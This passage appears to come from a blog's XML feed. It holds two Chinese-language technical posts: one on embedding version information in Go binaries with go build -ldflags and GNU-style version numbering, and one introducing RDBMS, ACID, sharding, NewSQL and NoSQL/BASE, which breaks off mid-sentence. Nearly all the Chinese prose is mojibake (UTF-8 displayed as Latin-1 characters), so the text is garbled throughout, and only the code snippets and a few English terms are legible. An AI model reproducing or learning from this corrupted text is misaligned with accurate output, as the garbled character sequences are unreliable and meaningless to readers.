    <content type="text"><![CDATA[é¡¹ç›®åœ¨å®Œæˆåå¾€å¾€éƒ½éœ€è¦ç‰ˆæœ¬åŒ–, è€ŒGolangé¡¹ç›®å¾€å¾€äº¤ä»˜çš„æ˜¯ç¼–è¯‘è¿‡åçš„äºŒè¿›åˆ¶åŒ…, å¦‚ä½•é€šè¿‡äºŒè¿›åˆ¶åŒ…çŸ¥é“é¡¹ç›®çš„ç‰ˆæœ¬, å°±åƒdockerçš„versionå‘½ä»¤ä¸€æ ·æ¥ ? ä¸ºä»€ä¹ˆéœ€è¦ç‰ˆæœ¬ç®¡ç†ç‰ˆæœ¬ç®¡ç†ä¸»è¦ç”¨äºå¯¹è¿è¡Œç¨‹åºçš„ç‰ˆæœ¬è¿½è¸ª,ä»è€Œå¯ä»¥ç®¡ç†çº¿ä¸ŠæœåŠ¡çš„è¿è¡Œç‰ˆæœ¬,é¿å…å„ä¸ªç‰ˆæœ¬çš„æœåŠ¡ç¨‹åºæ··æ·†.è¿™é‡Œé€šå¸¸çš„åšæ³•ä¸ºåœ¨ç¨‹åºä¸­åŸ‹å…¥ç‰ˆæœ¬æ ‡å¿—,åŒæ—¶è¯¥ç‰ˆæœ¬å·ä¼šå¯¹åº”åˆ°gitä¸Šçš„tagæˆ–releaseç‰ˆæœ¬.ä»è€Œå¯¹çº¿ä¸ŠæœåŠ¡æ›´æ”¹æœ‰ä¸€ä¸ªæ›´å…¨é¢çš„ä¿¡æ¯è¯´æ˜ã€‚ æ¯”å¦‚dockerçš„ç‰ˆæœ¬ä¿¡æ¯:123456789 maojun@maojun-mbp $ docker versionClient: Version: 17.09.0-ce API version: 1.32 Go version: go1.8.3 Git commit: afdb6d4 Built: Tue Sep 26 22:40:09 2017 OS/Arch: darwin/amd64... GUNé£æ ¼ç‰ˆæœ¬å‘½åæ–¹å¼å’Œè§„åˆ™è¿™é‡Œå°†ä»‹ç»åŸºäºGNUé£æ ¼çš„ä¸€ç§ç‰ˆæœ¬å‘½åæ–¹å¼, è¿™ä¹Ÿæ˜¯å½“ä»Šä¸»æµçš„ç‰ˆæœ¬å‘½åæ–¹å¼, å¾ˆå¤šå¼€æºé¡¹ç›®çš„ç‰ˆæœ¬å‘½åéƒ½éµå¾ªæ­¤é£æ ¼ã€‚GUNé£æ ¼ç‰ˆæœ¬å‘½åé£æ ¼:123Major_Version_Number.Minor_Version_Number[.Revision_Number[.Build_Number]] ä¸»ç‰ˆæœ¬å·.å­ç‰ˆæœ¬å·[.ä¿®æ­£ç‰ˆæœ¬å·[.ç¼–è¯‘ç‰ˆæœ¬å·]]ç¤ºä¾‹ : 1.2.1, 2.0, 5.0.0.build-13124 Major: å…·æœ‰ç›¸åŒåç§°ä½†ä¸åŒä¸»ç‰ˆæœ¬å·çš„ç¨‹åºé›†ä¸å¯äº’æ¢ã€‚ä¾‹å¦‚ï¼Œè¿™é€‚ç”¨äºå¯¹äº§å“çš„å¤§é‡é‡å†™ï¼Œè¿™äº›é‡å†™ä½¿å¾—æ— æ³•å®ç°å‘åå…¼å®¹æ€§ã€‚ Minor: å¦‚æœä¸¤ä¸ªç¨‹åºé›†çš„åç§°å’Œä¸»ç‰ˆæœ¬å·ç›¸åŒï¼Œè€Œæ¬¡ç‰ˆæœ¬å·ä¸åŒï¼Œè¿™æŒ‡ç¤ºæ˜¾è‘—å¢å¼ºï¼Œä½†ç…§é¡¾åˆ°äº†å‘åå…¼å®¹æ€§ã€‚ä¾‹å¦‚ï¼Œè¿™é€‚ç”¨äºäº§å“çš„ä¿®æ­£ç‰ˆæˆ–å®Œå…¨å‘åå…¼å®¹çš„æ–°ç‰ˆæœ¬ã€‚ Revision: åç§°ã€ä¸»ç‰ˆæœ¬å·å’Œæ¬¡ç‰ˆæœ¬å·éƒ½ç›¸åŒä½†ä¿®è®¢å·ä¸åŒçš„ç¨‹åºé›†åº”æ˜¯å®Œå…¨å¯äº’æ¢çš„ã€‚è¿™é€‚ç”¨äºä¿®å¤ä»¥å‰å‘å¸ƒçš„ç¨‹åºé›†ä¸­çš„å®‰å…¨æ¼æ´ã€‚ Build: å†…éƒ¨ç‰ˆæœ¬å·çš„ä¸åŒè¡¨ç¤ºå¯¹ç›¸åŒæºæ‰€ä½œçš„é‡æ–°ç¼–è¯‘ã€‚è¿™é€‚åˆäºæ›´æ”¹å¤„ç†å™¨ã€å¹³å°æˆ–ç¼–è¯‘å™¨çš„æƒ…å†µã€‚ ç‰ˆæœ¬å·çš„å˜åŒ–ä¸€èˆ¬éµå¾ªå¦‚ä¸‹è§„åˆ™: é¡¹ç›®åˆç‰ˆæœ¬ : ç‰ˆæœ¬å·å¯ä»¥ä¸º 0.1 æˆ– 0.1.0, ä¹Ÿå¯ä»¥ä¸º 1.0 æˆ– 1.0.0. ä¿®æ­£ç‰ˆæœ¬å·å¢åŠ : å½“é¡¹ç›®åœ¨è¿›è¡Œäº†å±€éƒ¨ä¿®æ”¹æˆ– bug ä¿®æ­£æ—¶ï¼Œä¸»ç‰ˆæœ¬å·å’Œå­ç‰ˆæœ¬å·éƒ½ä¸å˜,ä¿®æ­£ç‰ˆæœ¬å·åŠ 1. å­ç‰ˆæœ¬å·å¢åŠ  : å½“é¡¹ç›®åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¢åŠ äº†éƒ¨åˆ†åŠŸèƒ½æ—¶ï¼Œä¸»ç‰ˆæœ¬å·ä¸å˜ï¼Œå­ç‰ˆæœ¬å·åŠ  1ï¼Œä¿®æ­£ç‰ˆæœ¬å·å¤ä½ä¸º 0ï¼Œå› è€Œå¯ä»¥è¢«å¿½ç•¥æ‰. ä¸»ç‰ˆæœ¬å·å¢åŠ  : å½“é¡¹ç›®åœ¨è¿›è¡Œäº†é‡å¤§ä¿®æ”¹æˆ–å±€éƒ¨ä¿®æ­£ç´¯ç§¯è¾ƒå¤šï¼Œè€Œå¯¼è‡´é¡¹ç›®æ•´ä½“å‘ç”Ÿå…¨å±€å˜åŒ–æ—¶. ç¼–è¯‘ç‰ˆæœ¬å·å˜åŒ– : ç¼–è¯‘ç‰ˆæœ¬å·ä¸€èˆ¬æ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œæˆ‘ä»¬åªå®šä¹‰å…¶æ ¼å¼ï¼Œå¹¶ä¸è¿›è¡Œäººä¸ºæ§åˆ¶ å¦‚ä½•åŸ‹å…¥ç‰ˆæœ¬ä¿¡æ¯å†™C/C++ä»£ç æ—¶ï¼Œå¯ä»¥åœ¨ä»£ç ä¸­é¢„å®šä¹‰ä¸€äº›ç‰ˆæœ¬å®å®šä¹‰ï¼Œç„¶åå†ç¼–è¯‘æ—¶ä»å¤–éƒ¨ä¼ å…¥æ•°æ®ä½œä¸ºç‰ˆæœ¬å·, golangä»£ç ä¸æ”¯æŒå®å®šä¹‰, ä½†æ˜¯go buildæ—¶æä¾›äº†ä¸€ä¸ªä¸ä¹‹ç›¸ä¼¼çš„åŠŸèƒ½å‚æ•°:12-ldflags 'flag list' arguments to pass on each go tool link invocation. ç„¶åæŸ¥çœ‹go tool linkçš„ç›¸å…³æ–‡æ¡£:1234-X importpath.name=value Set the value of the string variable in importpath named name to value. Note that before Go 1.5 this option took two separate arguments. Now it takes one argument split on the first = sign. æŒ‰ç…§æ–‡æ¡£ä¸­çš„è¯´æ˜åº”è¯¥æ˜¯åœ¨buildæ—¶ï¼Œé€šè¿‡-ldflagsè®¾å®šlinkerçš„å‚æ•°ã€‚ ç„¶åå†é€šè¿‡linkerçš„-Xæ¥ä¿®æ”¹æŒ‡å®šè·¯å¾„ä¸‹é¢çš„å˜é‡å€¼12345678910111213package main import ( "fmt") var ( VERSION) func main() &#123; fmt.Printf("Version:[%s]\n", VERSION)&#125; ç¼–è¯‘æ—¶ä¼ å…¥å˜é‡:123$ go build -ldflags "-X main.VERSION=v1.0.0-alpha1" main.go$ ./mainVersion:[v1.0.0-alpha1] æœ€ç»ˆæ ·ä¾‹å¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨é¡¹ç›®å…¥å£æ–‡ä»¶å¤„åŸ‹å…¥ç‰ˆæœ¬ä¿¡æ¯, å¯¹é¡¹ç›®å…¥å£ä¾µå…¥å¤ªå¤§, å› æ­¤ä½ ä¼šçœ‹åˆ°ä¸€äº›å¥½çš„å¼€æºé¡¹ç›®ä¸‹éƒ½æœ‰ä¸€ä¸ªä¸“é—¨çš„versionåŒ…, ç”±å®ƒæ¥è´Ÿè´£æ¥æ”¶åŸ‹å…¥çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ æœ€ç»ˆç¤ºä¾‹è¯·å‚è€ƒ: Golangç¨‹åºç‰ˆæœ¬ç®¡ç†ä»£ç ç¤ºä¾‹123456 maojun@maojun-mbp $ ./version-example -vVersion : v0.0.1-alpha.0Build Time: 2017-11-19 23:28:12Git Branch: masterGit Commit: 83de09af3f96007726edd5b308ed989476b9f358Go Version: go1.9 linux/amd64]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•°æ®åº“åˆ†ç±»ä»¥åŠNoSQLä»‹ç»]]></title>
    <url>%2F2017%2F11%2F05%2Fmongodb-introduce%2F</url>
    <content type="text"><![CDATA[ç”±äºé¡¹ç›®éœ€è¦å­˜å‚¨ä¸€äº›æ— ç»“æ„çš„æ•°æ®, è¿™äº›æ•°æ®ä¸»è¦ä»¥æ–‡æœ¬ä¸ºä¸», åŒæ—¶è¿˜éœ€æ”¯æŒä¸€äº›æ–‡æœ¬åˆ†æ, å’‹ä¸€å¬ä¼¼ä¹ESæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, ä½†æ˜¯è¿™äº›æ— ç»“æ„çš„æ•°æ®åŒæ—¶ä¹Ÿéœ€è¦è¢«ç®¡ç†, ä¹Ÿå°±æ˜¯è¿™äº›æ•°æ®å¯èƒ½ç»å¸¸å˜æ›´, è¡¡é‡å†ä¸‰, æœ€åè¿˜æ˜¯é€‰æ‹©äº†Mongo, æ¯•ç«Ÿç°é˜¶æ®µæ˜¯ä»¥æ•°æ®çš„å­˜å‚¨å’Œç®¡ç†ä¸ºä¸», åˆ†æå¹¶æ²¡æœ‰é‚£ä¹ˆå¼ºçš„éœ€æ±‚ã€‚æ•´ç¯‡æ–‡ç« ä»¥å¤§æ•°æ®å­˜å‚¨é—®é¢˜ä¸ºå¼•, ä¸€æ­¥æ­¥å¼•å‡ºNoSQLé¢†åŸŸæ–‡æ¡£æ•°æ®çš„ä»£è¡¨MongoDBã€‚ å¤§æ•°æ®å­˜å‚¨é—®é¢˜E.F.Coddåœ¨1970å¹´é¦–æ¬¡æå‡ºäº†æ•°æ®åº“ç³»ç»Ÿçš„å…³ç³»æ¨¡å‹ï¼Œä»æ­¤å¼€åˆ›äº†æ•°æ®åº“å…³ç³»æ–¹æ³•å’Œå…³ç³»æ•°æ®ç†è®ºçš„ç ”ç©¶ï¼Œä¸ºæ•°æ®åº“æŠ€æœ¯å¥ å®šäº†ç†è®ºåŸºç¡€ï¼Œæ•°æ®åº“æŠ€æœ¯ä¹Ÿå¼€å§‹è“¬å‹ƒå‘å±•ã€‚è€Œéšç€å‡ å¤§æ•°æ®åº“å‚å•†é™†ç»­å‘å¸ƒçš„å•†ä¸šæ•°æ®åº“ç®¡ç†ç³»ç»Ÿå‡ ä¹éƒ½æ”¯æŒå…³ç³»æ•°æ®æ¨¡å‹ï¼Œæ•°æ®åº“æŠ€æœ¯é€æ¸ç»Ÿä¸€åˆ°ä»¥å…³ç³»å‹æ•°æ®åº“ä¸ºä¸»å¯¼ã€‚å…³ç³»æ¨¡å‹æœ‰æ‰å®çš„æ•°å­¦ç†è®ºåšåŸºç¡€, å¹¶ä¸”ç»è¿‡é•¿æ—¶é—´çš„å®è·µ, ä½¿å¾—å…¶åœ¨æ•°æ®å­˜å‚¨ä¸ç®¡ç†é¢†åŸŸå æ®ç»Ÿæ²»åœ°ä½ã€‚ 2001å¹´åï¼Œäº’è”ç½‘æŠ€æœ¯è¿…é€Ÿå‘å±•ï¼Œæ•°æ®é‡è¿…é€Ÿè†¨èƒ€å¹¶å¹¶å¤§ï¼Œäººç±»é€æ­¥è¿›å…¥å¤§æ•°æ®æ—¶ä»£ã€‚å¤§æ•°æ®ç»™ä¼ ç»Ÿçš„æ•°æ®ç®¡ç†æ–¹å¼å¸¦æ¥äº†ä¸¥å³»çš„æŒ‘æˆ˜ï¼Œå…³ç³»å‹æ•°æ®åº“åœ¨å®¹é‡ï¼Œæ€§èƒ½ï¼Œæˆæœ¬ç­‰å¤šæ–¹é¢éƒ½éš¾ä»¥æ»¡è¶³å¤§æ•°æ®ç®¡ç†çš„éœ€æ±‚ã€‚NoSQLæ•°æ®åº“é€šè¿‡æŠ˜ä¸­å…³ç³»å‹æ•°æ®åº“ä¸¥æ ¼çš„æ•°æ®ä¸€è‡´æ€§ç®¡ç†ï¼Œåœ¨å¯æ‰©å±•æ€§ã€æ¨¡å‹çµæ´»æ€§ã€ç»æµæ€§å’Œè®¿é—®æ€§ç­‰æ–¹é¢è·å¾—äº†å¾ˆå¤§çš„ä¼˜åŠ¿ï¼Œå¯ä»¥æ›´å¥½åœ°é€‚åº”å¤§æ•°æ®åº”ç”¨çš„éœ€æ±‚ï¼Œæˆä¸ºå¤§æ•°æ®æ—¶ä»£æœ€é‡è¦çš„æ•°æ®ç®¡ç†æŠ€æœ¯ã€‚ å›´ç»•å¤§æ•°æ®çš„å­˜å‚¨é—®é¢˜, æˆ‘ä»¬ä¾æ¬¡è®¨è®ºä¸‹æ•°æ®åº“çš„å‡ å¤§åˆ†ç±»: RDBMS, NewSQL, NoSQLã€‚ RDBMSåœ¨ç°ä»£çš„è®¡ç®—ç³»ç»Ÿä¸Šæ¯å¤©ç½‘ç»œä¸Šéƒ½ä¼šäº§ç”Ÿåºå¤§çš„æ•°æ®é‡ã€‚è¿™äº›æ•°æ®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ç”±å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(RDMBSs)æ¥å¤„ç†ã€‚ 1970å¹´ E.F.Coddâ€™sæå‡ºçš„å…³ç³»æ¨¡å‹çš„è®ºæ–‡ â€œA relational model of data for large shared data banksâ€ï¼Œè¿™ä½¿å¾—æ•°æ®å»ºæ¨¡å’Œåº”ç”¨ç¨‹åºç¼–ç¨‹æ›´åŠ ç®€å•ã€‚é€šè¿‡åº”ç”¨å®è·µè¯æ˜ï¼Œå…³ç³»æ¨¡å‹æ˜¯éå¸¸é€‚åˆäºå®¢æˆ·æœåŠ¡å™¨ç¼–ç¨‹ï¼Œè¿œè¿œè¶…å‡ºé¢„æœŸçš„åˆ©ç›Šï¼Œä»Šå¤©å®ƒæ˜¯ç»“æ„åŒ–æ•°æ®å­˜å‚¨åœ¨ç½‘ç»œå’Œå•†åŠ¡åº”ç”¨çš„ä¸»å¯¼æŠ€æœ¯ã€‚ ä»€ä¹ˆæ˜¯RDBMSï¼Ÿ RDBMSå…¨ç§°æ˜¯Relational Database Management System, åŠå…³ç³»å‹æ•°æ®ç®¡ç†ç³»ç»Ÿ, ä»–é‡‡ç”¨å…³ç³»æ¨¡å‹æ¥å­˜å‚¨æ•°æ®,å…³ç³»æ¨¡å‹æ˜¯æŠŠå¤æ‚çš„æ•°æ®ç»“æ„å½’ç»“ä¸ºç®€å•çš„äºŒå…ƒå…³ç³»(å³äºŒç»´è¡¨æ ¼å½¢å¼), åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­ï¼Œå¯¹æ•°æ®çš„æ“ä½œå‡ ä¹å…¨éƒ¨å»ºç«‹åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªå…³ç³»è¡¨æ ¼ä¸Šï¼Œé€šè¿‡å¯¹è¿™äº›å…³è”çš„è¡¨æ ¼åˆ†ç±»ã€åˆå¹¶ã€è¿æ¥æˆ–é€‰å–ç­‰è¿ç®—æ¥å®ç°æ•°æ®åº“çš„ç®¡ç†ã€‚ å…³ç³»å‹æ•°æ®çš„ç‰¹ç‚¹(ACID) å…³ç³»å‹æ•°æ®åº“éµå¾ªACIDè§„åˆ™, ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„äº‹ç‰©æ¨¡å‹(transaction), äº‹ç‰©è¿™ä¸ªæ¦‚å¿µå’Œç°å®ä¸–ç•Œä¸­çš„äº¤æ˜“å¾ˆç±»ä¼¼, å®ƒæœ‰å¦‚ä¸‹4ä¸ªç‰¹æ€§: A(Atomicity)åŸå­æ€§å¾ˆå®¹æ˜“ç†è§£ï¼Œä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡é‡Œçš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨åšå®Œï¼Œè¦ä¹ˆéƒ½ä¸åšï¼Œäº‹åŠ¡æˆåŠŸçš„æ¡ä»¶æ˜¯äº‹åŠ¡é‡Œçš„æ‰€æœ‰æ“ä½œéƒ½æˆåŠŸï¼Œåªè¦æœ‰ä¸€ä¸ªæ“ä½œå¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡å°±å¤±è´¥ï¼Œéœ€è¦å›æ»šã€‚æ¯”å¦‚é“¶è¡Œè½¬è´¦ï¼Œä»Aè´¦æˆ·è½¬100å…ƒè‡³Bè´¦æˆ·ï¼Œåˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š1ï¼‰ä»Aè´¦æˆ·å–100å…ƒï¼›2ï¼‰å­˜å…¥100å…ƒè‡³Bè´¦æˆ·ã€‚è¿™ä¸¤æ­¥è¦ä¹ˆä¸€èµ·å®Œæˆï¼Œè¦ä¹ˆä¸€èµ·ä¸å®Œæˆï¼Œå¦‚æœåªå®Œæˆç¬¬ä¸€æ­¥ï¼Œç¬¬äºŒæ­¥å¤±è´¥ï¼Œé’±ä¼šè«åå…¶å¦™å°‘äº†100å…ƒã€‚ C(Consistency)ä¸€è‡´æ€§ä¹Ÿæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®åº“è¦ä¸€ç›´å¤„äºä¸€è‡´çš„çŠ¶æ€ï¼Œäº‹åŠ¡çš„è¿è¡Œä¸ä¼šæ”¹å˜æ•°æ®åº“åŸæœ¬çš„ä¸€è‡´æ€§çº¦æŸã€‚ä¾‹å¦‚ç°æœ‰å®Œæ•´æ€§çº¦æŸa+b=10ï¼Œå¦‚æœä¸€ä¸ªäº‹åŠ¡æ”¹å˜äº†aï¼Œé‚£ä¹ˆå¿…é¡»å¾—æ”¹å˜bï¼Œä½¿å¾—äº‹åŠ¡ç»“æŸåä¾ç„¶æ»¡è¶³a+b=10ï¼Œå¦åˆ™äº‹åŠ¡å¤±è´¥ã€‚ I(Isolation)æ‰€è°“çš„ç‹¬ç«‹æ€§æ˜¯æŒ‡å¹¶å‘çš„äº‹åŠ¡ä¹‹é—´ä¸ä¼šäº’ç›¸å½±å“ï¼Œå¦‚æœä¸€ä¸ªäº‹åŠ¡è¦è®¿é—®çš„æ•°æ®æ­£åœ¨è¢«å¦å¤–ä¸€ä¸ªäº‹åŠ¡ä¿®æ”¹ï¼Œåªè¦å¦å¤–ä¸€ä¸ªäº‹åŠ¡æœªæäº¤ï¼Œå®ƒæ‰€è®¿é—®çš„æ•°æ®å°±ä¸å—æœªæäº¤äº‹åŠ¡çš„å½±å“ã€‚æ¯”å¦‚ç°æœ‰æœ‰ä¸ªäº¤æ˜“æ˜¯ä»Aè´¦æˆ·è½¬100å…ƒè‡³Bè´¦æˆ·ï¼Œåœ¨è¿™ä¸ªäº¤æ˜“è¿˜æœªå®Œæˆçš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ­¤æ—¶BæŸ¥è¯¢è‡ªå·±çš„è´¦æˆ·ï¼Œæ˜¯çœ‹ä¸åˆ°æ–°å¢åŠ çš„100å…ƒçš„ã€‚ D(Durability)æŒä¹…æ€§æ˜¯æŒ‡ä¸€æ—¦äº‹åŠ¡æäº¤åï¼Œå®ƒæ‰€åšçš„ä¿®æ”¹å°†ä¼šæ°¸ä¹…çš„ä¿å­˜åœ¨æ•°æ®åº“ä¸Šï¼Œå³ä½¿å‡ºç°å®•æœºä¹Ÿä¸ä¼šä¸¢å¤±ã€‚æ¯”å¦‚Aè´¦æˆ·æ”¶åˆ°äº†100å…ƒåˆ°è´¦, åªè¦åˆ°è´¦è¿™ä¸ªäº‹ç‰©å®Œæˆ, æ•°æ®å°±å·²ç»åˆ°æ•°æ®åº“é‡Œé¢äº†, å³ä½¿æ­¤æ—¶å®•æœºå¯¹Aç”¨æˆ·çš„èµ„äº§ä¹Ÿæ²¡æœ‰å½±å“ã€‚ å…¸å‹çš„äº§å“ å…³ç³»å‹æ•°æ®åº“è¯ç”Ÿ40å¤šå¹´äº†ï¼Œä»ç†è®ºäº§ç”Ÿå‘å±•åˆ°ç°å®äº§å“, RDBMSå¾ˆå¤šäº§å“åº”è¯¥éƒ½æ˜¯è€³ç†Ÿèƒ½è¯¦çš„: Oracle MySQL PostgreSQL SQLServer å¤§æ•°æ®å­˜å‚¨æ—¶é¢ä¸´çš„é—®é¢˜ å…³ç³»å‹æ•°æ®åº“ä¸¥æ ¼ACIDåŸåˆ™, å› æ­¤åœ¨æ‰©å±•æ€§ä¸Šè¡¨ç°ä¸æ˜¯ç‰¹åˆ«å¥½, é¢å¯¹å¤§è§„æ¨¡çš„æ•°æ®æ—¶, åœ¨è¯»å’Œå†™ä¸Šé¢ä¼šå‡ºç°ä¸¥é‡ç“¶é¢ˆã€‚æƒ³è¦æå‡å…¶æ€§èƒ½, å¾€å¾€éœ€è¦ä»ä¸šåŠ¡å±‚è¿›è¡Œå¤„ç†, è¿›è¡Œæ•°æ®çš„Shardingã€‚shardingæœ‰2ä¸ªç»´åº¦: æ°´å¹³åˆ‡åˆ†å’Œå‚ç›´åˆ‡åˆ†: æ°´å¹³åˆ‡åˆ†: æ ¹æ®è¡¨ä¸­çš„æ•°æ®çš„é€»è¾‘å…³ç³»ï¼Œå°†åŒä¸€å¼ è¡¨çš„æ•°æ®ï¼ŒæŒ‰ç…§æŸç§æ¡ä»¶åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ä¸»æœºä¸Š å‚ç›´åˆ‡åˆ†: æŒ‰ç…§ä¸åŒçš„è¡¨æˆ–è€…schemaï¼Œæ¥åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ä¸»æœºä¸Š åˆ‡ç‰‡(sharding)ä¼šå¢åŠ æ•´ä¸ªç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œè€Œä¸”åˆ‡ç‰‡æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ï¼Œä¸åº”ç”¨æœ¬èº«æœ‰è¿™å¯†åˆ‡çš„å…³ç³»ï¼Œæ‰€ä»¥å¯¹äºä¸ä½†å¢å¤§çš„æ•°æ®è€Œè¨€ï¼Œåˆ‡ç‰‡å¹¶ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³å¤§æ•°æ®å­˜å‚¨é—®é¢˜ã€‚ NewSQLä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®æƒ³è¦åšåˆ°é«˜æ‰©å±•, é«˜æ€§èƒ½, é«˜å¯é æ€§æ˜¯å¾ˆå¤æ‚çš„, ä½†æ˜¯å½“ä½ çš„ç¡®æƒ³è¦ä¸€ç§è¿™ç§æ ·çš„æ•°æ®åº“æ—¶, NewSQLå¯èƒ½æ˜¯ä½ ä¸€ç§ä¸é”™çš„é€‰æ‹©ã€‚ ä»€ä¹ˆæ˜¯NewSQLï¼Ÿ è¿™æ˜¯ä¸€ä¸ªä¸­é—´äº§ç‰©, æ˜¯ä¸€ç§å®Œå…¨ä¸åŒçš„æ•°æ®åº“æ¶æ„, NewSQLæœ¯è¯­æœ€æ—©åœ¨2011å¹´ç”±Matthew Aslettåˆ›é€ , NewSQLçš„è®¾è®¡ç«‹è¶³äºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿå¼•è¿›ä¸€äº›æ–°æŠ€æœ¯ï¼Œä»è€Œè¾¾åˆ°å¯æ‰©å±•å’Œé«˜æ€§èƒ½çš„ç›®çš„, è€Œç¼ºç‚¹æ˜¯æ²¡æœ‰æä¾›å¼ºä¸€è‡´æ€§, å®ƒä»¬ä¸å¯ä»¥è¢«ä½¿ç”¨åœ¨å¼ºä¸€è‡´æ€§ç¯å¢ƒä¸‹ã€‚NewSQLå…·æœ‰NoSQLçš„æµ·é‡æ•°æ®å­˜å‚¨ç®¡ç†èƒ½åŠ›,åŒæ—¶è¿˜æ”¯æŒä¼ ç»Ÿæ•°æ®åº“çš„ACIDå’ŒSQLèƒ½åŠ›(å•ä¸ªèŠ‚ç‚¹ä¸Šçš„ACIDèƒ½åŠ›), ä½†æ˜¯åœ¨ç°å®ä½¿ç”¨ä¸­è¿˜æ²¡æ™®åŠå¼€æ¥, è¿˜æ²¡è¢«å¤§è§„æ¨¡ä½¿ç”¨ã€‚ NewSQLçš„ç‰¹ç‚¹ NewSQLå…·ä½“å’ŒRDBMSä¸€æ ·çš„å•ä¸ªèŠ‚ç‚¹ä¸Šçš„ACIDèƒ½åŠ›, åŒæ—¶åˆå…·æœ‰NoSQLä¸€æ ·çš„å¾ˆå¼ºçš„æ‰©å±•èƒ½åŠ›(å®ƒåœ¨æ•´ä¸ªé›†ç¾¤ä¸Šéµå¾ªBASEè§„åˆ™, å…³äºBASEåœ¨åé¢NoSQLä¸­å†åšä»‹ç»)ã€‚ å…¸å‹çš„NewSQLäº§å“ æˆ‘è¿„ä»Šä¹Ÿæ²¡æœ‰ä½¿ç”¨è¿‡NewSQLäº§å“, ä»¥ä¸‹æ˜¯æˆ‘æ‰€çŸ¥çš„å…³äºNewSQLçš„ç»å…¸äº§å“: Google spanner: Googleçš„å…¨çƒçº§çš„åˆ†å¸ƒå¼æ•°æ®åº“(Globally-Distributed Database) CockroachDB: å‚è€ƒGoole spannerå®ç°çš„å¼€æºç‰ˆ å¦‚ä½•è§£å†³å¤§æ•°æ®å­˜å‚¨é—®é¢˜ï¼Ÿ NewSQLåŸºäºNoSQLçš„BASEåŸåˆ™, æ„å»ºå¯ä»¥æ¨ªå‘æ‰©å±•çš„åˆ†å¸ƒå¼ç³»ç»Ÿæ¥è§£å†³å¤§æ•°æ®çš„å­˜å‚¨å’Œç®¡ç†é—®é¢˜ã€‚ NoSQLä»Šå¤©æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹å¹³å°(å¦‚ï¼šGoogle,Facebookç­‰), å¯ä»¥å¾ˆå®¹æ˜“çš„è®¿é—®å’ŒæŠ“å–æ•°æ®ã€‚ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œç¤¾äº¤ç½‘ç»œï¼Œåœ°ç†ä½ç½®ï¼Œç”¨æˆ·ç”Ÿæˆçš„æ•°æ®å’Œç”¨æˆ·æ“ä½œæ—¥å¿—å·²ç»æˆå€çš„å¢åŠ ã€‚æˆ‘ä»¬å¦‚æœè¦å¯¹è¿™äº›ç”¨æˆ·æ•°æ®è¿›è¡ŒæŒ–æ˜ï¼Œé‚£SQLæ•°æ®åº“å·²ç»ä¸é€‚åˆè¿™äº›åº”ç”¨äº†, NoSQLæ•°æ®åº“çš„å‘å±•ä¹Ÿå´èƒ½å¾ˆå¥½çš„å¤„ç†è¿™äº›å¤§çš„æ•°æ®ã€‚ ä»€ä¹ˆæ˜¯NoSQLï¼Ÿ NoSQL(NoSQL = Not Only SQL)ï¼Œæ„å³â€œä¸ä»…ä»…æ˜¯SQLâ€ï¼Œæ˜¯ä¸€é¡¹å…¨æ–°çš„æ•°æ®åº“é©å‘½æ€§è¿åŠ¨ï¼Œæ—©æœŸå°±æœ‰äººæå‡ºï¼Œå‘å±•è‡³2009å¹´è¶‹åŠ¿è¶Šå‘é«˜æ¶¨ã€‚NoSQLçš„æ‹¥æŠ¤è€…ä»¬æå€¡è¿ç”¨éå…³ç³»å‹çš„æ•°æ®å­˜å‚¨ï¼Œç›¸å¯¹äºé“ºå¤©ç›–åœ°çš„å…³ç³»å‹æ•°æ®åº“è¿ç”¨ï¼Œè¿™ä¸€æ¦‚å¿µæ— ç–‘æ˜¯ä¸€ç§å…¨æ–°çš„æ€ç»´çš„æ³¨å…¥ NoSQLçš„ç‰¹ç‚¹(BASE) BASEçš„å…¨ç§°æ˜¯Basically Available, Soft-state, Eventually Consistentã€‚ ç”±Eric Brewerå®šä¹‰ã€‚ACIDå¼ºè°ƒå¼ºä¸€è‡´æ€§(CAPä¸­çš„C), è€ŒBASEåˆ™å¼ºè°ƒåŸºæœ¬å¯ç”¨æ€§(CAPä¸­çš„Aï¼‰ï¼Œåœ¨BASEæ€æƒ³çš„æ‰©å±•ä¸‹ï¼Œå°±å‡ºç°äº†NoSQLã€‚BASEæ˜¯NoSQLæ•°æ®åº“é€šå¸¸å¯¹å¯ç”¨æ€§åŠä¸€è‡´æ€§çš„å¼±è¦æ±‚åŸåˆ™: Basically Availble: åŸºæœ¬å¯ç”¨ Soft-state: è½¯çŠ¶æ€/æŸ”æ€§äº‹åŠ¡ã€‚ â€œSoft stateâ€ å¯ä»¥ç†è§£ä¸ºâ€æ— è¿æ¥â€çš„, è€Œ â€œHard stateâ€ 